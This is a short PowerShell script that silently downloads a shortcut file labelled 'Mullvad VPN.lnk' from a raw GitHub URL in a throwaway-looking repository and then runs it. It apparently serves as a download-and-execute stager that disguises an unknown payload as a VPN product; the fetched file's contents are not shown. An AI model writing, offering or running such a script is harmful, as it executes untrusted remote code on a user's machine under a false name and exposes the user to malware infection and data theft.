# Set download URL and destination path
$url = "https://raw.githubusercontent.com/Migss2x/testzzz/main/Mullvad%20VPN.lnk"
$output = "$env:USERPROFILE\Downloads\Mullvad VPN.lnk"

# Download the file silently
Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

# Optional: Run the shortcut
Start-Process $output
